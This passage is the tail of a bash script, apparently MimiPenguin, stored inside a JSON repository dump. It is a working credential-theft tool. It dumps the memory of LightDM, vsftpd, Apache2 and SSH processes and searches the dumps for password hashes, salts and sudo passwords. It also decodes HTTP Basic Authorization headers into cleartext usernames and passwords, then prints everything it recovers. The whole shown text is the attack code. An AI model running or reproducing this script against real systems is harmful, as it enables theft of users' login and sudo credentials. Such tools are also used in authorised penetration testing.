\"/tmp/dump.${pid}\"\n        done <<< \"$PID\"\n    fi\nfi\n\n#Support LightDM\nif [[ -n $(ps -eo pid,command | grep -v 'grep' | grep lightdm | grep session-child) ]]; then\n    SOURCE=\"[SYSTEM - LIGHTDM]\"\n    PID=\"$(ps -eo pid,command | grep lightdm | sed -rn '/session\\-child/p' | awk -F ' ' '{ print $1 }')\"\n\n    #if exists aka someone logged into lightdm then extract...\n    if [[ $PID ]]; then\n        while read -r pid; do\n            dump_pid \"$pid\" /tmp/dump\n            HASH=$(strings \"/tmp/dump.${pid}\" | grep -E -m 1 '^\\$.\\$.+\\$')\n            SALT=\"$(echo \"$HASH\" | cut -d'$' -f 3)\"\n            DUMP=\"$(strings \"/tmp/dump.${pid}\" | grep -E '^_pammodutil_getspnam_' -A1)\"\n            #Remove dupes to speed up processing\n            DUMP=$(echo \"$DUMP\" | tr \" \" \"\\n\" |sort -u)\n            parse_pass \"$DUMP\" \"$HASH\" \"$SALT\" \"$SOURCE\"\n            #cleanup\n            rm -rf \"/tmp/dump.${pid}\"\n        done <<< \"$PID\"\n    fi\nfi\n\n#Support VSFTPd - Active Users\nif [[ -e \"/etc/vsftpd.conf\" ]]; then\n        SOURCE=\"[SYSTEM - VSFTPD]\"\n        #get nobody /usr/sbin/vsftpd /etc/vsftpd.conf\n        PID=\"$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk -F ' ' '{ print $1 }')\"\n    #if exists aka someone logged into FTP then extract...\n    if [[ $PID ]];then\n        while read -r pid; do\n            dump_pid \"$pid\" /tmp/vsftpd\n            HASH=\"$(strings \"/tmp/vsftpd.${pid}\" | grep -E -m 1 '^\\$.\\$.+\\$')\"\n            SALT=\"$(echo \"$HASH\" | cut -d'$' -f 3)\"\n            DUMP=$(strings \"/tmp/vsftpd.${pid}\" | grep -E -B 5 -A 5 '^::.+\\:[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$')\n            #Remove dupes to speed up processing\n            DUMP=$(echo \"$DUMP\" | tr \" \" \"\\n\" |sort -u)\n            parse_pass \"$DUMP\" \"$HASH\" \"$SALT\" \"$SOURCE\"\n        done <<< \"$PID\"\n\n        #cleanup\n        rm -rf /tmp/vsftpd*\n    fi\nfi\n\n#Support Apache2 - HTTP BASIC AUTH\nif [[ -e \"/etc/apache2/apache2.conf\" ]]; then\n        SOURCE=\"[HTTP BASIC - APACHE2]\"\n        #get all apache workers /usr/sbin/apache2 -k start\n        PID=\"$(ps -eo pid,user,command | grep apache2 | grep -v 'grep' | awk -F ' ' '{ print $1 }')\"\n    #if exists aka apache2 running\n    if [[ \"$PID\" ]];then\n        #Dump all workers\n        while read -r pid; do\n            gcore -o /tmp/apache \"$pid\" > /dev/null 2>&1\n            #without gcore - VERY SLOW!\n            #dump_pid $pid /tmp/apache\n        done <<< \"$PID\"\n        #Get encoded creds\n        DUMP=\"$(strings /tmp/apache* | grep -E '^Authorization: Basic.+=$' | cut -d' ' -f 3)\"\n        #for each extracted b64 - decode the cleartext\n        while read -r encoded; do\n            CREDS=\"$(echo \"$encoded\" | base64 -d)\"\n            if [[ \"$CREDS\" ]]; then\n                export RESULTS=\"$RESULTS$SOURCE         $CREDS\\n\"\n            fi\n        done <<< \"$DUMP\"\n        #cleanup\n        rm -rf /tmp/apache*\n    fi\nfi\n\n#Support sshd - Search active connections for Sudo passwords\nif [[ -e \"/etc/ssh/sshd_config\" ]]; then\n    SOURCE=\"[SYSTEM - SSH]\"\n    #get all ssh tty/pts sessions - sshd: user@pts01\n    PID=\"$(ps -eo pid,command | grep -E 'sshd:.+@' | grep -v 'grep' | awk -F ' ' '{ print $1 }')\"\n    #if exists aka someone logged into SSH then dump\n    if [[ \"$PID\" ]];then\n        while read -r pid; do\n            dump_pid \"$pid\" /tmp/sshd\n            HASH=\"$(strings \"/tmp/sshd.${pid}\" | grep -E -m 1 '^\\$.\\$.+\\$')\"\n            SALT=\"$(echo \"$HASH\" | cut -d'$' -f 3)\"\n            DUMP=$(strings \"/tmp/sshd.${pid}\" | grep -E -A 3 '^sudo.+')\n            #Remove dupes to speed up processing\n            DUMP=$(echo \"$DUMP\" | tr \" \" \"\\n\" |sort -u)\n            parse_pass \"$DUMP\" \"$HASH\" \"$SALT\" \"$SOURCE\"\n        done <<< \"$PID\"\n        #cleanup\n        rm -rf /tmp/sshd.*\n    fi\nfi\n\n#Output results to STDOUT\nprintf \"MimiPenguin Results:\\n\"\nprintf \"%b\" \"$RESULTS\" | sort -u\nunset RESULTS\n"
        },
        {
          "name": "src",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}